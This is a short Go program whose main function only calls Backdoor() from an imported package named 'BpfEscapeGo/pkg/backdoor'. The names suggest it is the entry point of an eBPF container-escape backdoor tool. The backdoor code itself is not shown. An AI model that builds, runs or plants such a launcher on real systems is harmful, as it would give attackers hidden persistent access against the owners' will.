package main

import (
	"github.com/awslshadowstar/BpfEscapeGo/pkg/backdoor"
)

const mapKey uint32 = 0

func main() {
	backdoor.Backdoor()
}
